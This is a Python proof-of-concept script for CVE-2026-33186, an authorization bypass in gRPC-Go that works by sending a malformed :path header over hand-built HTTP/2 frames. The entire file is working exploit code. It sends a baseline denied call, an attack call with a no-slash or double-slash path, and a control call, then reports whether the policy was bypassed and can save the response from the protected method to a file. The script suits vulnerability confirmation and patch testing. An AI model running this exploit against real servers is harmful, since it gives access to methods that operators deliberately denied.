#!/usr/bin/env python3
"""
CVE-2026-33186 -- gRPC-Go authorization policy bypass via malformed :path

The canonical upstream trigger is a :path without the leading slash:

    Service/Method

Some reverse-proxy deployments preserve other malformed path forms before
forwarding to grpc-go. Use --path-mode to test the form that reaches the
backend in your environment.

Requirements:
    pip install h2
    Python >= 3.8
"""

import argparse
import os
import socket
import struct
import sys
import time
from typing import Optional, Tuple

try:
    import h2.config
    import h2.connection
    import h2.events
except ImportError:
    print("[!] h2 library not found. Install with: pip install h2")
    sys.exit(2)


def encode_grpc_frame(data: bytes) -> bytes:
    return b"\x00" + struct.pack(">I", len(data)) + data


def decode_grpc_frame(data: bytes) -> bytes:
    return data[5:] if len(data) >= 5 else data


def encode_proto_string(s: str) -> bytes:
    encoded = s.encode("utf-8")
    if len(encoded) >= 128:
        raise ValueError("demo protobuf encoder only supports short strings")
    return bytes([0x0A, len(encoded)]) + encoded


def read_varint(data: bytes, offset: int) -> Tuple[int, int]:
    value = 0
    shift = 0
    while offset < len(data):
        b = data[offset]
        offset += 1
        value |= (b & 0x7F) << shift
        if not (b & 0x80):
            return value, offset
        shift += 7
    raise ValueError("truncated varint")


def decode_proto_string(data: bytes, field: int = 1) -> Optional[str]:
    """Extract a string field from a simple protobuf message."""
    i = 0
    while i < len(data):
        try:
            tag, i = read_varint(data, i)
            wire = tag & 0x07
            fnum = tag >> 3
            if wire == 2:
                length, i = read_varint(data, i)
                value = data[i:i + length]
                i += length
                if fnum == field:
                    return value.decode("utf-8", errors="replace")
            elif wire == 0:
                _, i = read_varint(data, i)
            else:
                break
        except (IndexError, ValueError):
            break
    return None


def raw_summary(data: bytes) -> str:
    return f"<raw {len(data)} bytes: {data.hex()[:160]}>"


def send_grpc_call(host: str, port: int, path: str, payload: bytes, label: str,
                   connect_host: Optional[str] = None,
                   authority: Optional[str] = None,
                   response_field: int = 1,
                   timeout: float = 5.0) -> dict:
    print(f"\n{'=' * 60}")
    print(f"  Call: {label}")
    print(f"  :path header = {path!r}")
    print(f"{'=' * 60}")

    sock = socket.create_connection((connect_host or host, port), timeout=timeout)

    config = h2.config.H2Configuration(client_side=True, header_encoding="utf-8")
    conn = h2.connection.H2Connection(config=config)
    conn.initiate_connection()
    sock.sendall(conn.data_to_send(65535))

    raw = sock.recv(65535)
    conn.receive_data(raw)
    out = conn.data_to_send(65535)
    if out:
        sock.sendall(out)

    headers = [
        (":method", "POST"),
        (":scheme", "http"),
        (":path", path),
        (":authority", authority or f"{host}:{port}"),
        ("content-type", "application/grpc"),
        ("te", "trailers"),
        ("grpc-encoding", "identity"),
        ("user-agent", "poc-cve-2026-33186/1.1"),
    ]

    sid = conn.get_next_available_stream_id()
    conn.send_headers(sid, headers)
    sock.sendall(conn.data_to_send(65535))
    conn.send_data(sid, encode_grpc_frame(payload), end_stream=True)
    sock.sendall(conn.data_to_send(65535))

    result = {"grpc_status": None, "grpc_message": None, "raw_body": b""}
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            sock.settimeout(min(2.0, timeout))
            raw = sock.recv(65535)
        except socket.timeout:
            break
        if not raw:
            break
        events = conn.receive_data(raw)
        out = conn.data_to_send(65535)
        if out:
            sock.sendall(out)
        for ev in events:
            if isinstance(ev, h2.events.DataReceived):
                result["raw_body"] += ev.data
                conn.acknowledge_received_data(ev.flow_controlled_length, ev.stream_id)
                out = conn.data_to_send(65535)
                if out:
                    sock.sendall(out)
            elif isinstance(ev, (h2.events.TrailersReceived, h2.events.ResponseReceived)):
                for name, value in ev.headers:
                    if name == "grpc-status":
                        result["grpc_status"] = int(value)
                    elif name == "grpc-message":
                        result["grpc_message"] = value
            elif isinstance(ev, h2.events.StreamEnded):
                deadline = 0

    try:
        conn.close_connection()
        out = conn.data_to_send(65535)
        if out:
            sock.sendall(out)
    except Exception:
        pass
    sock.close()

    body = decode_grpc_frame(result["raw_body"]) if result["raw_body"] else b""
    result["response_bytes"] = body
    result["response_body"] = (
        decode_proto_string(body, field=response_field)
        or decode_proto_string(body, field=1)
        or (raw_summary(body) if body else None)
    )

    names = {0: "OK", 1: "Cancelled", 2: "Unknown", 3: "InvalidArgument",
             5: "NotFound", 7: "PermissionDenied", 12: "Unimplemented", 13: "Internal"}
    status = result["grpc_status"]
    print(f"  gRPC status:  {status} ({names.get(status, str(status))})")
    if result["grpc_message"]:
        print(f"  gRPC message: {result['grpc_message']}")
    if result.get("response_body"):
        print(f"  Response:     {result['response_body'][:240]}")

    return result


def build_attack_path(args) -> str:
    if args.path_mode == "custom":
        if not args.attack_path:
            raise ValueError("--path-mode custom requires --attack-path")
        return args.attack_path
    if args.path_mode == "double-slash":
        return f"//{args.service}/{args.method}"
    if args.path_mode == "no-slash":
        return f"{args.service}/{args.method}"
    raise ValueError(f"unknown path mode: {args.path_mode}")


def write_response(path: str, text: Optional[str], raw: bytes) -> None:
    if text is not None:
        with open(path, "w", encoding="utf-8") as f:
            f.write(text)
            if not text.endswith("\n"):
                f.write("\n")
    else:
        with open(path, "wb") as f:
            f.write(raw)
    os.chmod(path, 0o600)


def main():
    parser = argparse.ArgumentParser(
        description="CVE-2026-33186 PoC -- gRPC-Go authz bypass via malformed :path",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Examples:\n"
            "  python3 poc.py --host 10.0.0.5 --port 50051\n"
            "  python3 poc.py --host 10.0.0.5 --port 50051 --service MyService --method SecretMethod\n"
            "  python3 poc.py --host vhost.example --connect-host 10.0.0.5 --port 80 --path-mode double-slash\n"
            "  python3 poc.py --host vhost.example --connect-host 10.0.0.5 --path-mode custom --attack-path //S/M\n"
            "\n"
            "Exit codes: 0=vulnerable/confirmed, 1=patched/not-bypassed, 2=error\n"
        ),
    )
    parser.add_argument("--host", default="127.0.0.1",
                        help="HTTP/2 :authority host unless --authority is set")
    parser.add_argument("--connect-host", default=None,
                        help="TCP destination host/IP when it differs from --host")
    parser.add_argument("--authority", default=None,
                        help="explicit HTTP/2 :authority value")
    parser.add_argument("--port", type=int, default=50051)
    parser.add_argument("--service", default="TestService")
    parser.add_argument("--method", default="AdminMethod")
    parser.add_argument("--public-method", default="PublicMethod", dest="public_method")
    parser.add_argument("--path-mode", choices=["no-slash", "double-slash", "custom"],
                        default="no-slash")
    parser.add_argument("--attack-path", default=None,
                        help="literal attack :path when --path-mode custom is used")
    parser.add_argument("--request-string", default="poc",
                        help="field-1 string payload to send")
    parser.add_argument("--response-field", type=int, default=1,
                        help="protobuf string field to print/extract from responses")
    parser.add_argument("--output-response", default=None,
                        help="write the decoded attack response to this local file")
    parser.add_argument("--expect-substring", default=None,
                        help="require this substring in the decoded attack response")
    parser.add_argument("--timeout", type=float, default=5.0)
    args = parser.parse_args()

    try:
        attack_path = build_attack_path(args)
        payload = encode_proto_string(args.request_string)
    except ValueError as exc:
        print(f"[ERROR] {exc}")
        sys.exit(2)

    admin_path = f"/{args.service}/{args.method}"
    public_path = f"/{args.service}/{args.public_method}"

    print()
    print("CVE-2026-33186 -- gRPC-Go Authorization Policy Bypass")
    print("Affected: google.golang.org/grpc < v1.79.3")
    print(f"Target TCP: {args.connect_host or args.host}:{args.port}")
    print(f"HTTP/2 authority: {args.authority or args.host + ':' + str(args.port)}")
    print(f"Attack path mode: {args.path_mode}")
    print()
    print("Policy under test:")
    print(f"  DENY  {admin_path}")
    print(f"  ALLOW {public_path}")
    print("  ALLOW * (default)")

    try:
        r1 = send_grpc_call(args.host, args.port, admin_path, payload,
                            f"BASELINE: {admin_path} -- expect DENIED",
                            args.connect_host, args.authority, args.response_field,
                            args.timeout)
        r2 = send_grpc_call(args.host, args.port, attack_path, payload,
                            f"ATTACK:   {attack_path} -- expect BYPASS",
                            args.connect_host, args.authority, args.response_field,
                            args.timeout)
        r3 = send_grpc_call(args.host, args.port, public_path, payload,
                            f"CONTROL:  {public_path} -- expect OK",
                            args.connect_host, args.authority, args.response_field,
                            args.timeout)
    except Exception as exc:
        print(f"\n[ERROR] gRPC exchange failed: {exc}")
        sys.exit(2)

    print()
    print("=" * 60)
    print("SUMMARY")
    print("=" * 60)

    baseline_denied = r1["grpc_status"] == 7
    bypass_succeeded = r2["grpc_status"] == 0
    public_ok = r3["grpc_status"] == 0
    attack_text = r2.get("response_body")

    print(f"  Baseline {admin_path}: status={r1['grpc_status']} "
          f"{'DENIED (correct)' if baseline_denied else 'UNEXPECTED'}")
    print(f"  Attack   {attack_path}: status={r2['grpc_status']} "
          f"{'BYPASS CONFIRMED' if bypass_succeeded else 'not bypassed'}")
    print(f"  Control  {public_path}: status={r3['grpc_status']} "
          f"{'OK (correct)' if public_ok else 'UNEXPECTED'}")
    print()

    if args.output_response and bypass_succeeded:
        write_response(args.output_response, attack_text, r2["response_bytes"])
        print(f"Attack response written to {args.output_response}")

    if args.expect_substring and args.expect_substring not in (attack_text or ""):
        print("[ERROR] Attack succeeded but expected substring was not found.")
        sys.exit(2)

    if baseline_denied and bypass_succeeded:
        print("[VULNERABLE] CVE-2026-33186 confirmed on this server.")
        sys.exit(0)
    if not baseline_denied:
        print(f"[ERROR] Baseline not denied (status={r1['grpc_status']}).")
        sys.exit(2)

    print(f"[PATCHED] Attack returned status={r2['grpc_status']}.")
    sys.exit(1)


if __name__ == "__main__":
    main()
